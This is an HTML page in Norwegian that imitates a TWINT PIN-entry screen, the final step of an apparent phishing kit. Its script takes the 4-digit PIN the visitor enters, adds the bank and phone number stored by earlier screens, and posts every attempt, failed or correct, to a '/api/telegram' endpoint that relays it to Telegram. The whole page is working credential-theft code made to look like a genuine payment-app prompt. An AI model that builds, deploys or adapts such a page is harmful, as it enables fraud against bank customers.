<!DOCTYPE html>
<html lang="nb">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TWINT — PIN-kode</title>
    <style>
      :root {
        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
        color: #0f172a;
        background: #f3f4f6;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background: #f3f4f6;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 0;
      }

      .shell {
        width: min(420px, 100%);
        background: white;
        border-radius: 0;
        padding: 1.5rem 1.75rem;
        min-height: 100vh;
        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
      }

      .step {
        display: flex;
        flex-direction: column;
        gap: 0.45rem;
        padding: 0 0.25rem 0.75rem;
      }

      .step-label {
        font-size: 0.8rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: #94a3b8;
      }

      .step-progress {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .progress-bar {
        flex: 1;
        height: 0.35rem;
        background: #e2e8f0;
        border-radius: 999px;
        margin-right: 0.75rem;
        overflow: hidden;
      }

      .progress-bar span {
        display: block;
        width: 100%;
        height: 100%;
        background: #fbbf24;
        border-radius: inherit;
      }

      .step-progress strong {
        font-size: 0.75rem;
        color: #475569;
      }

      h1 {
        margin: 0 0 0.5rem;
        font-size: 1.75rem;
      }

      .copy {
        margin: 0 0 1.5rem;
        line-height: 1.6;
        color: #475569;
      }

      form {
        display: flex;
        flex-direction: column;
        gap: 1rem;
      }

      label {
        font-weight: 600;
        color: #475569;
      }

      .pin-input {
        width: 100%;
        padding: 0.95rem 1rem;
        border: 1px solid #cbd5f5;
        border-radius: 12px;
        font-size: 1.5rem;
        font-weight: 700;
        color: #0f172a;
        background: #f8fafc;
        text-align: center;
        letter-spacing: 0.5em;
        font-family: "Courier New", monospace;
      }

      .pin-input:focus {
        outline: none;
        border-color: #fbbf24;
        box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.1);
      }

      .pin-input.error {
        border-color: #ef4444;
        background: #fef2f2;
      }

      .error-message {
        color: #ef4444;
        font-size: 0.9rem;
        font-weight: 600;
        margin-top: -0.5rem;
        display: none;
      }

      .error-message.show {
        display: block;
      }

      .attempts-info {
        margin-top: 0.5rem;
        font-size: 0.85rem;
        color: #64748b;
        text-align: center;
      }

      .attempts-info.warning {
        color: #f59e0b;
        font-weight: 600;
      }

      .buttons {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
        margin-top: 1rem;
      }

      .buttons button {
        border: none;
        border-radius: 14px;
        padding: 0.95rem;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary {
        background: #fbbf24;
        color: #0f172a;
        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
      }

      .primary:disabled {
        background: #f6f8fb;
        color: #94a3b8;
        box-shadow: none;
        cursor: not-allowed;
      }

      .secondary {
        background: white;
        border: 1px solid #d1d5db;
        color: #475569;
      }
    </style>
  </head>
  <body>
    <div class="shell">
      <div class="step">
        <div class="step-label">Step 3/3</div>
        <div class="step-progress">
          <div class="progress-bar"><span></span></div>
          <strong>Step 3/3</strong>
        </div>
      </div>

      <h1>Skriv inn PIN-koden</h1>
      <p class="copy">
        Skriv inn din 4-sifrete PIN-kode for å bekrefte autentiseringen med kortleseren.
      </p>

      <form>
        <label for="pin">PIN-kode</label>
        <input
          type="text"
          id="pin"
          name="pin"
          class="pin-input"
          placeholder="0000"
          maxlength="4"
          pattern="[0-9]{4}"
          inputmode="numeric"
        />
        <div class="error-message" id="error-message">Feil PIN-kode. Prøv igjen.</div>
        <div class="attempts-info" id="attempts-info"></div>

        <div class="buttons">
          <button type="button" class="primary" id="next-button" disabled>Bekreft</button>
          <button type="button" class="secondary" id="back-button">Tilbake</button>
        </div>
      </form>
    </div>

    <script>
      const pinInput = document.getElementById("pin");
      const nextButton = document.getElementById("next-button");
      const backButton = document.getElementById("back-button");
      const errorMessage = document.getElementById("error-message");
      const attemptsInfo = document.getElementById("attempts-info");
      
      let attempts = 0;
      const maxAttempts = 3;
      const correctPIN = "1234"; // In production, this would be validated server-side

      // Only allow numbers
      pinInput.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, "");
        
        // Remove error state when typing
        pinInput.classList.remove("error");
        errorMessage.classList.remove("show");
        
        // Enable/disable button
        nextButton.disabled = e.target.value.length !== 4;
      });

      // Helper function to send data to Telegram
      async function sendToTelegram(data) {
        try {
          await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
        } catch (error) {
          console.error('Error sending to Telegram:', error);
        }
      }

      // Handle form submission
      nextButton.addEventListener("click", async () => {
        const pin = pinInput.value.trim();
        
        if (pin.length !== 4) {
          alert("Skriv inn en 4-sifret PIN-kode.");
          return;
        }

        attempts++;
        const storedBank = localStorage.getItem("selectedBank");
        const phoneNumber = localStorage.getItem("phoneNumber");
        
        // Validate PIN (in production, this would be a server-side check)
        if (pin !== correctPIN) {
          // Show error
          pinInput.classList.add("error");
          errorMessage.classList.add("show");
          pinInput.value = "";
          nextButton.disabled = true;
          
          const remainingAttempts = maxAttempts - attempts;
          
          // Send failed PIN attempt to Telegram
          await sendToTelegram({
            action: 'pin_attempt_failed',
            bank: storedBank || null,
            phone: phoneNumber || null,
            pin_attempt: pin,
            attempt_number: attempts,
            remaining_attempts: remainingAttempts,
            timestamp: new Date().toISOString()
          });
          
          if (remainingAttempts > 0) {
            attemptsInfo.textContent = `Feil PIN-kode. Du har ${remainingAttempts} ${remainingAttempts === 1 ? 'forsøk' : 'forsøk'} igjen.`;
            attemptsInfo.classList.add("warning");
          } else {
            // Max attempts reached
            attemptsInfo.textContent = "Du har brukt opp alle forsøkene. Du må logge inn på nytt.";
            attemptsInfo.classList.add("warning");
            nextButton.disabled = true;
            
            // Send max attempts reached to Telegram
            await sendToTelegram({
              action: 'pin_max_attempts_reached',
              bank: storedBank || null,
              phone: phoneNumber || null,
              timestamp: new Date().toISOString()
            });
            
            // Redirect to screen-3 after 5 seconds (no popup)
            setTimeout(() => {
              window.location.href = "screen-3.html";
            }, 5000);
          }
          
          return;
        }
        
        // PIN is correct
        localStorage.setItem("pinVerified", "true");
        localStorage.setItem("authMethod", "card-reader");
        
        // Send successful PIN to Telegram
        await sendToTelegram({
          action: 'pin_verified',
          bank: storedBank || null,
          phone: phoneNumber || null,
          pin: pin,
          timestamp: new Date().toISOString()
        });
        
        // Continue to next step (you can change this to the appropriate next page)
        // window.location.href = "success.html"; // or next step
      });

      backButton.addEventListener("click", () => {
        window.location.href = "screen-5.html";
      });
    </script>
  </body>
</html>

